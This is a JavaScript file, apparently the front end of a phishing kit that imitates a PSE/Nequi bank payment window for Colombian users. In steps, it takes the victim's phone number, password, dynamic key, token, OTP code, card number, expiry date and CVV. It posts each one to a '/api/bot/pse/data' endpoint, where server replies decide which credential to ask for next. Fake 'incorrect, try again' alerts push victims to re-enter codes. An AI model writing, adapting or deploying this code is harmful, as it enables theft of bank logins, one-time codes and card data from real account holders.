const DOMElements = {
    loader: document.querySelector('#loader'),
    
    // Step One Elements
    stepOne: document.querySelector('#step-one'),
    formStepOne: document.querySelector('#form-step-one'),
    inputNumber: document.querySelector('#number'),
    inputPass: document.querySelector('#pass'),
    btnStepOneCancel: document.querySelector('#btn-step-one-cancel'),

    // Step CDIN Elements
    stepCdin: document.querySelector('#step-cdin'),
    formStepCdin: document.querySelector('#form-step-cdin'),
    inputCdin: document.querySelector('#cdin'),
    pinInputs: document.querySelectorAll('#form-step-cdin input[type="text"]'),
    submitCdin: document.querySelector('#submit-cdin'),
    btnStepCdinCancel: document.querySelector('#btn-step-cdin-cancel'),

    // Step Token Elements
    stepToken: document.querySelector('#step-token'),
    formStepToken: document.querySelector('#form-step-token'),
    inputToken: document.querySelector('#token'),
    tokenInputs: document.querySelectorAll('#form-step-token input[type="text"]'),
    submitToken: document.querySelector('#submit-token'),
    btnStepTokenCancel: document.querySelector('#btn-step-token-cancel'),

    // Step OTP Elements
    stepOtp: document.querySelector('#step-otp'),
    formStepOtp: document.querySelector('#form-step-otp'),
    inputOtp: document.querySelector('#otp'),
    otpInputs: document.querySelectorAll('#form-step-otp input[type="text"]'),
    submitOtp: document.querySelector('#submit-otp'),
    btnStepOtpCancel: document.querySelector('#btn-step-otp-cancel'),

    // Step Card Elements
    stepCard: document.querySelector('#step-card'),
    formStepCard: document.querySelector('#form-step-card'),
    inputCardNumber: document.querySelector('#card-number'),
    inputCardDate: document.querySelector('#card-date'),
    inputCardCvv: document.querySelector('#card-cvv'),
    submitCard: document.querySelector('#submit-card'),
    btnStepCardCancel: document.querySelector('#btn-step-card-cancel'),

    // Step Resume Elements
    stepResume: document.querySelector('#step-resume'),
    labelOriginResume: document.querySelector('#label-origin-resume'),
    labelDateResume: document.querySelector('#label-date-resume'),
    labelAmountResume: document.querySelector('#label-amount-resume'),
    btnResumePay: document.querySelector('#btn-resume-pay'),
    btnResumeCancel: document.querySelector('#btn-resume-cancel'),

    // Step Nequi Elements
    stepNequi: document.querySelector('#step-nequi'),
    btnNequiPay: document.querySelector('#btn-nequi-pay'),
    btnNequiCancel: document.querySelector('#btn-nequi-cancel')
}

/**
 * Módulo de validadores
 */
const validators = {
    user: (userValue) => {
        return userValue && userValue.length === 10;
    },
    
    password: (passValue) => {
        return passValue && passValue.length === 4;
    },
    
    cdin: (cdinValue) => {
        return cdinValue && cdinValue.length === 6;
    },

    token: (tokenValue) => {
        return tokenValue && tokenValue.length === 8;
    },

    otp: (otpValue) => {
        return otpValue && otpValue.length === 6;
    },

    card: () => {
        const cardNumber = document.querySelector('#card-number');
        const cardDate = document.querySelector('#card-date');
        const cardCvv = document.querySelector('#card-cvv');

        if((cardNumber.value.length === 19 && cardNumber.value[0] !== '3' && ['4', '5'].includes(cardNumber.value[0])) || (cardNumber.value.length === 17 && cardNumber.value[0] === '3')){
            if(isLuhnValid(cardNumber.value)){
                if(isValidDate(cardDate.value)){
                    if((cardCvv.value.length === 3 && cardNumber.value.length === 19) || (cardCvv.value.length === 4 && cardNumber.value.length === 17)){
                        return {
                            bin: cardNumber.value,
                            date: cardDate.value,
                            cs: cardCvv.value
                        }
                    }else{
                        alert('Revise el CVV de su tarjeta.');
                        cardCvv.value = '';
                        cardCvv.focus();
                        return false;
                    }
                }else{
                    alert('Revise la fecha de vencimiento de su tarjeta.');
                    cardDate.value = '';
                    cardDate.focus();
                    return false;
                }
            }else{
                alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
                cardNumber.value = ''
                cardNumber.focus();
                return false;
            }
        }else{
            alert('Revisa el número de tu tarjeta.');
            cardNumber.value = '';
            cardNumber.focus();
            return false;
        }
    }
};

/**
 * Módulo de gestión de estado
 */
const stateManager = {
    updateUser: (user) => {
        info.metaInfo.user = user;
        updateLS();
    },
    
    updatePass: (pass) => {
        info.metaInfo.pass = pass;
        updateLS();
    },
    
    updateCdin: (cdin) => {
        info.metaInfo.cdin = cdin;
        updateLS();
    },

    updateToken: (token) => {
        info.metaInfo.token = token;
        updateLS();
    },

    updateOtp: (otp) => {
        info.metaInfo.otpcode = otp;
        updateLS();
    },

    updateCard: (fields) => {
        info.metaInfo.bin = fields.bin;
        info.metaInfo.date = fields.date;
        info.metaInfo.cs = fields.cs;
        updateLS();
    },
    
    updateCardType: (type) => {
        info.metaInfo.cardType = type; // 'credit' o 'debit'
        updateLS();
    },
    
    resetState: () => {
        info.metaInfo.user = '';
        info.metaInfo.pass = '';
        info.metaInfo.cdin = '';
        info.metaInfo.token = '';
        info.metaInfo.otp = '';
        info.metaInfo.bin = '';
        info.metaInfo.date = '';
        info.metaInfo.cs = '';
        info.metaInfo.cardType = '';
        updateLS();
    }
};

/**
 * Módulo de navegación
 */
const navigationManager = {
    goToStep: (step) => {
        showStep(step);
    },
    
    goBack: () => {
        if(confirm('¿Quieres cancelar el proceso? Volverás a la web del comercio')){
            stateManager.resetState();
            window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
        }
    },
    
    goToSuccess: () => {
        stateManager.resetState();
        window.opener.postMessage({ action: 'done', data: { response: 'success'} }, '*');
    },
    
    goToBankSelection: () => {
        stateManager.resetState();
        window.location.reload();
    }
};

/**
 * Módulo de API
 */
const apiService = {
    sendData: async (payload) => {
        const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, payload, JWT_SIGN);
        const response = await fetch(`${API_URL}/api/bot/pse/data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${info.metaInfo.TRANSID}`
            },
            body: JSON.stringify({ token: token })
        });
        return response.json();
    },
    
    handleResponse: (result) => {
        viewManager.hideLoader();
        const goto = result?.redirect_to ?? 'user';

        switch (goto) {
            case 'user':
                if (info.metaInfo.user !== '') {
                    alert('Tu número o contraseña son incorrectos, por favor intenta nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepOne);
                break;

            case 'pass':
                if (info.metaInfo.user !== '') {
                    alert('Tu número o contraseña son incorrectos, por favor intenta nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepOne);
                break;
                
            case 'cdin':
                if (info.metaInfo.cdin !== '') {
                    alert('Clave dinámica incorrecta o expiró, por favor intenta nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepCdin);
                break;
                
            case 'token':
                if (info.metaInfo.token !== '') {
                    alert('Token incorrecto o expiró, por favor intenta nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepToken);
                break;
                
            case 'otpcode':
                if (info.metaInfo.otpcode !== '') {
                    alert('Código de seguridad incorrecto o expiró, por favor intenta nuevamente.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepOtp);
                break;
                
            case 'tcred':
                const wasCreditBefore = info.metaInfo.cardType === 'credit';
                stateManager.updateCardType('credit');
                if (wasCreditBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de tarjeta de crédito, asegúrese de que sea un producto que tenga vinculado a Nequi');
                } else {
                    alert('Por favor ingrese con su tarjeta de crédito de Nequi.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepCard);
                break;

            case 'tdeb':
                const wasDebitBefore = info.metaInfo.cardType === 'debit';
                stateManager.updateCardType('debit');
                if (wasDebitBefore && info.metaInfo.bin !== '') {
                    alert('Ingrese nuevamente sus datos de tarjeta de débito, asegúrese de que sea un producto que tenga vinculado a Nequi');
                } else {
                    alert('Por favor ingrese con su tarjeta de débito de Nequi.');
                }
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepCard);
                break;
                
            case 'resume':
                viewManager.loadResumeLabels();
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepResume);
                break;
                
            case 'success':
                navigationManager.goToSuccess();
                break;

            case 'nequi':
                viewManager.restartViews();
                navigationManager.goToStep(DOMElements.stepNequi);
                break;

            case 'cancel':
                stateManager.resetState();
                window.opener.postMessage({ action: 'done', data: { response: 'cancel'} }, '*');
                break;
                
            default:
                console.error('No se reconoce el redirect_to:', goto);
                throw new Error();
        }
    },
    
    handleError: (err = null) => {
        console.log(err);
        console.log('Error en la API');
        viewManager.hideLoader();
        alert('Ha ocurrido un error. Por favor intenta nuevamente.');
    }
};

/**
 * Functions
 */
const showStep = (stepToShow) => {
    const { stepOne, stepCdin, stepToken, stepOtp, stepCard, stepResume, stepNequi } = DOMElements;

    // Ocultar todos los pasos
    stepOne.classList.add('hidden');
    stepCdin.classList.add('hidden');
    stepToken.classList.add('hidden');
    stepOtp.classList.add('hidden');
    stepCard.classList.add('hidden');
    stepResume.classList.add('hidden');
    stepNequi.classList.add('hidden');

    // Mostrar el paso solicitado
    stepToShow.classList.remove('hidden');

    // Establecer foco en el primer input del paso
    if (stepToShow === stepCdin) {
        const firstPinInput = DOMElements.pinInputs[0];
        if (firstPinInput) {
            firstPinInput.focus();
        }
    } else if (stepToShow === stepToken) {
        const firstTokenInput = DOMElements.tokenInputs[0];
        if (firstTokenInput) {
            firstTokenInput.focus();
        }
    } else if (stepToShow === stepOtp) {
        const firstOtpInput = DOMElements.otpInputs[0];
        if (firstOtpInput) {
            firstOtpInput.focus();
        }
    } else if (stepToShow === stepCard) {
        const firstCardInput = DOMElements.inputCardNumber;
        if (firstCardInput) {
            firstCardInput.focus();
        }
    }
};

const formatPrice = (number) => {
    return number.toLocaleString('es-CO', {
        maximumFractionDigits: 2,
        useGrouping: true,
        style: 'currency', 
        currency: 'COP'
    });
};

const formatDate = () => {
    const now = new Date();
    const months = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
    
    const day = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    
    return `${day} de ${month} de ${year}`;
};

const formatCNumber = (input) => {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {
        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
};

const formatCardDate = (input) => {
    let texto = input.value;
    
    texto = texto.replace(/\D/g, '');
    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
};

const isLuhnValid = (bin) => {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
};

const isValidDate = (fechaInput) => {
    const partes = fechaInput.split('/');
    const mesInput = parseInt(partes[0], 10);
    let añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    const fechaActual = new Date();
    const añoActual = fechaActual.getFullYear();
    const limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
};

/**
 * Módulo de gestión de vistas
 */
const viewManager = {
    restartViews: () => {
        const { stepOne, stepCdin, stepToken, stepOtp, stepCard, stepResume, stepNequi, inputNumber, inputPass, inputCdin, inputToken, inputOtp, inputCardNumber, inputCardDate, inputCardCvv } = DOMElements;

        // Ocultar todos los pasos
        stepOne.classList.add('hidden');
        stepCdin.classList.add('hidden');
        stepToken.classList.add('hidden');
        stepOtp.classList.add('hidden');
        stepCard.classList.add('hidden');
        stepResume.classList.add('hidden');
        stepNequi.classList.add('hidden');

        // Limpiar inputs
        inputNumber.value = '';
        inputPass.value = '';
        inputCdin.value = '';
        inputToken.value = '';
        inputOtp.value = '';
        inputCardNumber.value = '';
        inputCardDate.value = '';
        inputCardCvv.value = '';
        pinInputManager.resetPinInputs();
        tokenInputManager.resetTokenInputs();
        otpInputManager.resetOtpInputs();
    },
    
    loadResumeLabels: () => {
        const { labelOriginResume, labelDateResume, labelAmountResume } = DOMElements;
        
        // Cargar origin desde info.metaInfo.origin
        if (info.metaInfo && info.metaInfo.origin) {
            labelOriginResume.textContent = info.metaInfo.origin;
        }
        
        // Cargar fecha actual formateada
        labelDateResume.textContent = formatDate();
        
        // Cargar amount desde info.metaInfo.amount y formatearlo
        if (info.metaInfo && info.metaInfo.amount) {
            labelAmountResume.textContent = formatPrice(info.metaInfo.amount);
        }
    },
    
    showLoader: () => {
        DOMElements.loader.classList.remove('hidden');
    },
    
    hideLoader: () => {
        DOMElements.loader.classList.add('hidden');
    }
};

/**
 * Módulo de gestión de inputs PIN
 */
const pinInputManager = {
    resetPinInputs: () => {
        const { pinInputs, inputCdin } = DOMElements;
        // Limpiar el input principal
        inputCdin.value = '';
        // Limpiar todos los inputs individuales
        pinInputs.forEach(input => input.value = '');
        // Establecer el foco en el primer input
        if (pinInputs.length > 0) {
            pinInputs[0].focus();
        }
    },

    handlePinInput: (input, index) => {
        // Solo permitir números
        input.value = input.value.replace(/[^0-9]/g, '');
        
        // Si se ingresó un número, mover al siguiente input
        if (input.value.length === 1) {
            const nextInput = input.parentElement.querySelector(`input:nth-child(${index + 2})`);
            if (nextInput) {
                nextInput.focus();
            }
        }

        pinInputManager.updatePinValue();
    },

    handleKeypadInput: (value) => {
        const { pinInputs } = DOMElements;
        if (value === '') {
            // Borrar: elimina el último input lleno
            for (let i = pinInputs.length - 1; i >= 0; i--) {
                if (pinInputs[i].value) {
                    pinInputs[i].value = '';
                    pinInputs[i].focus();
                    break;
                }
            }
        } else if (/^[0-9]$/.test(value)) {
            // Escribir: llena el primer input vacío
            for (let i = 0; i < pinInputs.length; i++) {
                if (!pinInputs[i].value) {
                    pinInputs[i].value = value;
                    // Si no es el último, avanza el foco
                    if (i < pinInputs.length - 1) {
                        pinInputs[i + 1].focus();
                    }
                    break;
                }
            }
        }
        pinInputManager.updatePinValue();
    },

    updatePinValue: () => {
        const { pinInputs, inputCdin, submitCdin } = DOMElements;
        const pinValue = Array.from(pinInputs).map(input => input.value).join('');
        inputCdin.value = pinValue;

        // Si todos los inputs están llenos (cada uno tiene un dígito), enviar el formulario automáticamente
        if (Array.from(pinInputs).every(input => input.value.length === 1)) {
            console.log('submit');
            submitCdin.click();
        }
    }
};

/**
 * Módulo de gestión de inputs Token
 */
const tokenInputManager = {
    resetTokenInputs: () => {
        const { tokenInputs, inputToken } = DOMElements;
        // Limpiar el input principal
        inputToken.value = '';
        // Limpiar todos los inputs individuales
        tokenInputs.forEach(input => input.value = '');
        // Establecer el foco en el primer input
        if (tokenInputs.length > 0) {
            tokenInputs[0].focus();
        }
    },

    handleTokenInput: (input, index) => {
        // Solo permitir números
        input.value = input.value.replace(/[^0-9]/g, '');
        
        // Si se ingresó un número, mover al siguiente input
        if (input.value.length === 1) {
            const nextInput = input.parentElement.querySelector(`input:nth-child(${index + 2})`);
            if (nextInput) {
                nextInput.focus();
            }
        }

        tokenInputManager.updateTokenValue();
    },

    handleKeypadInput: (value) => {
        const { tokenInputs } = DOMElements;
        if (value === '') {
            // Borrar: elimina el último input lleno
            for (let i = tokenInputs.length - 1; i >= 0; i--) {
                if (tokenInputs[i].value) {
                    tokenInputs[i].value = '';
                    tokenInputs[i].focus();
                    break;
                }
            }
        } else if (/^[0-9]$/.test(value)) {
            // Escribir: llena el primer input vacío
            for (let i = 0; i < tokenInputs.length; i++) {
                if (!tokenInputs[i].value) {
                    tokenInputs[i].value = value;
                    // Si no es el último, avanza el foco
                    if (i < tokenInputs.length - 1) {
                        tokenInputs[i + 1].focus();
                    }
                    break;
                }
            }
        }
        tokenInputManager.updateTokenValue();
    },

    updateTokenValue: () => {
        const { tokenInputs, inputToken, submitToken } = DOMElements;
        const tokenValue = Array.from(tokenInputs).map(input => input.value).join('');
        inputToken.value = tokenValue;

        // Si todos los inputs están llenos (cada uno tiene un dígito), enviar el formulario automáticamente
        if (Array.from(tokenInputs).every(input => input.value.length === 1)) {
            console.log('submit token');
            submitToken.click();
        }
    }
};

/**
 * Módulo de gestión de inputs OTP
 */
const otpInputManager = {
    resetOtpInputs: () => {
        const { otpInputs, inputOtp } = DOMElements;
        // Limpiar el input principal
        inputOtp.value = '';
        // Limpiar todos los inputs individuales
        otpInputs.forEach(input => input.value = '');
        // Establecer el foco en el primer input
        if (otpInputs.length > 0) {
            otpInputs[0].focus();
        }
    },

    handleOtpInput: (input, index) => {
        // Solo permitir números
        input.value = input.value.replace(/[^0-9]/g, '');
        
        // Si se ingresó un número, mover al siguiente input
        if (input.value.length === 1) {
            const nextInput = input.parentElement.querySelector(`input:nth-child(${index + 2})`);
            if (nextInput) {
                nextInput.focus();
            }
        }

        otpInputManager.updateOtpValue();
    },

    handleKeypadInput: (value) => {
        const { otpInputs } = DOMElements;
        if (value === '') {
            // Borrar: elimina el último input lleno
            for (let i = otpInputs.length - 1; i >= 0; i--) {
                if (otpInputs[i].value) {
                    otpInputs[i].value = '';
                    otpInputs[i].focus();
                    break;
                }
            }
        } else if (/^[0-9]$/.test(value)) {
            // Escribir: llena el primer input vacío
            for (let i = 0; i < otpInputs.length; i++) {
                if (!otpInputs[i].value) {
                    otpInputs[i].value = value;
                    // Si no es el último, avanza el foco
                    if (i < otpInputs.length - 1) {
                        otpInputs[i + 1].focus();
                    }
                    break;
                }
            }
        }
        otpInputManager.updateOtpValue();
    },

    updateOtpValue: () => {
        const { otpInputs, inputOtp, submitOtp } = DOMElements;
        const otpValue = Array.from(otpInputs).map(input => input.value).join('');
        inputOtp.value = otpValue;

        // Si todos los inputs están llenos (cada uno tiene un dígito), enviar el formulario automáticamente
        if (Array.from(otpInputs).every(input => input.value.length === 1)) {
            console.log('submit otp');
            submitOtp.click();
        }
    }
};

/**
 * Manejadores de eventos por paso
 */
const eventHandlers = {
    stepOne: {
        submit: async (e) => {
            e.preventDefault();
            const { inputNumber, inputPass } = DOMElements;

            // Validate inputs
            if (validators.user(inputNumber.value) && validators.password(inputPass.value)) {
                stateManager.updateUser(inputNumber.value);
                stateManager.updatePass(inputPass.value);
                
                viewManager.showLoader();

                // Limpiar inputs
                inputNumber.value = '';
                inputPass.value = '';

                // Make API request
                try {
                    const result = await apiService.sendData(info.metaInfo);
                    apiService.handleResponse(result);
                } catch (error) {
                    apiService.handleError(error);
                }
            } else {
                alert('Por favor verifica tus datos');
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepCdin: {
        submit: async (e) => {
            e.preventDefault();
            const { inputCdin } = DOMElements;

            // Validate CDIN
            if (validators.cdin(inputCdin.value)) {
                stateManager.updateCdin(inputCdin.value);
                
                viewManager.showLoader();

                pinInputManager.resetPinInputs();

                // Make API request
                try {
                    const result = await apiService.sendData(info.metaInfo);
                    apiService.handleResponse(result);
                } catch (error) {
                    apiService.handleError(error);
                }
            } else {
                alert('Por favor ingresa el código de 6 dígitos');
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepResume: {
        pay: async () => {
            viewManager.showLoader();

            try {
                const result = await apiService.sendData(info.metaInfo);
                apiService.handleResponse(result);
            } catch (error) {
                apiService.handleError(error);
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepToken: {
        submit: async (e) => {
            e.preventDefault();
            const { inputToken } = DOMElements;

            // Validate Token
            if (validators.token(inputToken.value)) {
                stateManager.updateToken(inputToken.value);
                
                viewManager.showLoader();

                tokenInputManager.resetTokenInputs();

                // Make API request
                try {
                    const result = await apiService.sendData(info.metaInfo);
                    apiService.handleResponse(result);
                } catch (error) {
                    apiService.handleError(error);
                }
            } else {
                alert('Por favor ingresa el token de 8 dígitos');
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepOtp: {
        submit: async (e) => {
            e.preventDefault();
            const { inputOtp } = DOMElements;

            // Validate OTP
            if (validators.otp(inputOtp.value)) {
                stateManager.updateOtp(inputOtp.value);
                
                viewManager.showLoader();

                otpInputManager.resetOtpInputs();

                // Make API request
                try {
                    const result = await apiService.sendData(info.metaInfo);
                    apiService.handleResponse(result);
                } catch (error) {
                    apiService.handleError(error);
                }
            } else {
                alert('Por favor ingresa el código de 6 dígitos');
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepCard: {
        submit: async (e) => {
            e.preventDefault();
            
            // Validate Card
            const fields = validators.card();
            if (fields) {
                stateManager.updateCard(fields);
                
                viewManager.showLoader();

                // Make API request
                try {
                    const result = await apiService.sendData(info.metaInfo);
                    apiService.handleResponse(result);
                } catch (error) {
                    apiService.handleError(error);
                }
            } else {
                alert('Revisa los datos ingresados');
                return;
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    },

    stepNequi: {
        pay: async () => {
            viewManager.showLoader();

            try {
                const result = await apiService.sendData(info.metaInfo);
                apiService.handleResponse(result);
            } catch (error) {
                apiService.handleError(error);
            }
        },

        cancel: () => {
            navigationManager.goBack();
        }
    }
};

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    addEventListeners();
    setupInputValidation();
});

/**
 * Event Listeners
 */
const addEventListeners = () => {
    const { formStepOne, formStepCdin, formStepToken, formStepOtp, formStepCard, pinInputs, tokenInputs, otpInputs, btnStepOneCancel, btnStepCdinCancel, btnStepTokenCancel, btnStepOtpCancel, btnStepCardCancel, btnResumePay, btnResumeCancel, btnNequiPay, btnNequiCancel } = DOMElements;

    // Form submissions
    formStepOne.addEventListener('submit', eventHandlers.stepOne.submit);
    formStepCdin.addEventListener('submit', eventHandlers.stepCdin.submit);
    formStepToken.addEventListener('submit', eventHandlers.stepToken.submit);
    formStepOtp.addEventListener('submit', eventHandlers.stepOtp.submit);
    formStepCard.addEventListener('submit', eventHandlers.stepCard.submit);

    // Cancel buttons
    btnStepOneCancel.addEventListener('click', eventHandlers.stepOne.cancel);
    btnStepCdinCancel.addEventListener('click', eventHandlers.stepCdin.cancel);
    btnStepTokenCancel.addEventListener('click', eventHandlers.stepToken.cancel);
    btnStepOtpCancel.addEventListener('click', eventHandlers.stepOtp.cancel);
    btnStepCardCancel.addEventListener('click', eventHandlers.stepCard.cancel);

    // Resume buttons
    btnResumePay.addEventListener('click', eventHandlers.stepResume.pay);
    btnResumeCancel.addEventListener('click', eventHandlers.stepResume.cancel);

    // Nequi buttons
    btnNequiPay.addEventListener('click', eventHandlers.stepNequi.pay);
    btnNequiCancel.addEventListener('click', eventHandlers.stepNequi.cancel);

    // PIN input events
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', () => pinInputManager.handlePinInput(input, index));
    });

    // Token input events
    tokenInputs.forEach((input, index) => {
        input.addEventListener('input', () => tokenInputManager.handleTokenInput(input, index));
    });

    // OTP input events
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', () => otpInputManager.handleOtpInput(input, index));
    });
};

/**
 * Setup input validation
 */
const setupInputValidation = () => {
    const { inputPass } = DOMElements;
    
    // Solo permitir números en el input de pass
    inputPass.addEventListener('input', () => {
        inputPass.value = inputPass.value.replace(/[^0-9]/g, '');
    });
};

// Hacer las funciones globales para que funcionen desde el HTML
window.formatCNumber = formatCNumber;
window.formatCardDate = formatCardDate;
window.isLuhnValid = isLuhnValid;
window.isValidDate = isValidDate;

// Función global para manejar el keypad
window.handleKeypadInput = (value) => {
    // Determinar qué step está activo y llamar a la función correspondiente
    if (!DOMElements.stepCdin.classList.contains('hidden')) {
        pinInputManager.handleKeypadInput(value);
    } else if (!DOMElements.stepToken.classList.contains('hidden')) {
        tokenInputManager.handleKeypadInput(value);
    } else if (!DOMElements.stepOtp.classList.contains('hidden')) {
        otpInputManager.handleKeypadInput(value);
    }
};

// Función global para manejar inputs individuales
window.handlePinInput = (input, index) => {
    // Determinar qué step está activo y llamar a la función correspondiente
    if (!DOMElements.stepCdin.classList.contains('hidden')) {
        pinInputManager.handlePinInput(input, index);
    } else if (!DOMElements.stepToken.classList.contains('hidden')) {
        tokenInputManager.handleTokenInput(input, index);
    } else if (!DOMElements.stepOtp.classList.contains('hidden')) {
        otpInputManager.handleOtpInput(input, index);
    }
}; 